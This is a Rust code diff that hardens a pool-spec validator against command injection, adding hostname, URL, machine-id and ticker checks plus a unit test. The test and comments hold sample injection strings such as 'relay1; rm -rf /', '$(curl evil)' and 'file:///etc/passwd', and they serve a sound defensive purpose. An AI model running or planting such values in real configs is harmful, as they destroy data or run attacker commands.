@@ -145,6 +145,16 @@ impl PoolSpec {
                 "pool ticker must be 3-5 characters".to_string(),
             ));
         }
+        // S0016 p4-1 — content validation of every field the target L2 scripts interpolate.
+        // Defense in depth over S0015 shell-quoting: a crafted spec is rejected at validate()
+        // time, so a hostile value never reaches a rendered config, a topology file, or a
+        // shell. (schema only bounds these by minLength:1 — the real gate is here.)
+        if !self.pool.ticker.chars().all(|c| c.is_ascii_uppercase() || c.is_ascii_digit()) {
+            return Err(OuroError::Validation(
+                "pool ticker must be uppercase alphanumeric [A-Z0-9]".to_string(),
+            ));
+        }
+        reject_unsafe_url("pool.metadata_url", &self.pool.metadata_url)?;
         if !(0.0..=1.0).contains(&self.pool.margin) {
             return Err(OuroError::Validation(
                 "pool margin must be between 0 and 1".to_string(),
@@ -159,6 +169,19 @@ impl PoolSpec {
                     "duplicate machine id {}",
                     machine.id
                 )));
+            }
+            // p4-1: id is used as OURO_MACHINE + a path/state component → single [a-z0-9-] segment.
+            if machine.id.is_empty()
+                || !machine.id.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
+            {
+                return Err(OuroError::Validation(format!(
+                    "machine id must be a single [a-z0-9-] segment: {}",
+                    machine.id
+                )));
+            }
+            reject_unsafe_host(&format!("machine {} ssh.host", machine.id), &machine.ssh.host)?;
+            if let Some(ep) = &machine.public_endpoint {
+                reject_unsafe_host(&format!("machine {} public_endpoint.host", machine.id), &ep.host)?;
             }
             if machine.ssh.user != "ouro-exec" {
                 return Err(OuroError::Validation(format!(
@@ -275,6 +298,43 @@ impl GenesisHashes {
     }
 }
 
+/// p4-1 — a hostname/IP a target script will interpolate. Allow only DNS/IP characters; any
+/// shell metacharacter, whitespace, or control char is rejected (a value like
+/// `relay1; rm -rf /` or `$(curl evil)` never reaches a rendered config or a shell).
+fn reject_unsafe_host(field: &str, value: &str) -> Result<()> {
+    if value.is_empty()
+        || value.len() > 253
+        || !value
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == ':')
+    {
+        return Err(OuroError::Validation(format!(
+            "{field} must be a hostname/IP of [A-Za-z0-9.:-]: got {value:?}"
+        )));
+    }
+    Ok(())
+}
+
+/// p4-1 — a metadata URL a target script may echo into config. Require http(s), bound the
+/// length, and reject shell metacharacters / whitespace / control chars.
+fn reject_unsafe_url(field: &str, value: &str) -> Result<()> {
+    let ok_scheme = value.starts_with("https://") || value.starts_with("http://");
+    let clean = value.chars().all(|c| {
+        !c.is_ascii_control()
+            && !c.is_whitespace()
+            && !matches!(
+                c,
+                '`' | '$' | ';' | '|' | '&' | '"' | '\'' | '\\' | '<' | '>' | '(' | ')' | '{' | '}'
+            )
+    });
+    if !ok_scheme || value.len() > 200 || !clean {
+        return Err(OuroError::Validation(format!(
+            "{field} must be a clean http(s) URL (no shell metacharacters): got {value:?}"
+        )));
+    }
+    Ok(())
+}
+
 #[cfg(test)]
 mod tests {
     use super::{Network, PoolSpec};
@@ -288,6 +348,46 @@ mod tests {
         assert!(spec.validate().is_ok());
         spec.pool.network = Network::Mainnet;
         assert!(spec.validate().is_err());
+    }
+
+    fn valid_spec() -> PoolSpec {
+        serde_json::from_str(include_str!(
+            "../../../tests/fixtures/pool-spec/valid-minimal.json"
+        ))
+        .unwrap()
+    }
+
+    #[test]
+    fn rejects_injection_in_interpolated_fields() {
+        // p4-1: each field a target script interpolates must reject shell/DNS-unsafe values.
+        let base = valid_spec();
+        assert!(base.validate().is_ok(), "baseline fixture is valid");
+
+        let mut s = valid_spec();
+        s.machines[0].ssh.host = "relay1; rm -rf /".to_string();
+        assert!(s.validate().is_err(), "shell metachars in ssh.host rejected");
+
+        let mut s = valid_spec();
+        if let Some(ep) = s.machines.iter_mut().find_map(|m| m.public_endpoint.as_mut()) {
+            ep.host = "$(curl evil)".to_string();
+            assert!(s.validate().is_err(), "command-sub in endpoint.host rejected");
+        }
+
+        let mut s = valid_spec();
+        s.pool.metadata_url = "https://x/`reboot`.json".to_string();
+        assert!(s.validate().is_err(), "backtick in metadata_url rejected");
+
+        let mut s = valid_spec();
+        s.pool.metadata_url = "file:///etc/passwd".to_string();
+        assert!(s.validate().is_err(), "non-http(s) metadata_url rejected");
+
+        let mut s = valid_spec();
+        s.machines[0].id = "bp 1; touch x".to_string();
+        assert!(s.validate().is_err(), "space/metachar in machine id rejected");
+
+        let mut s = valid_spec();
+        s.pool.ticker = "ab;".to_string();
+        assert!(s.validate().is_err(), "non-alnum ticker rejected");
     }
 
     #[test]
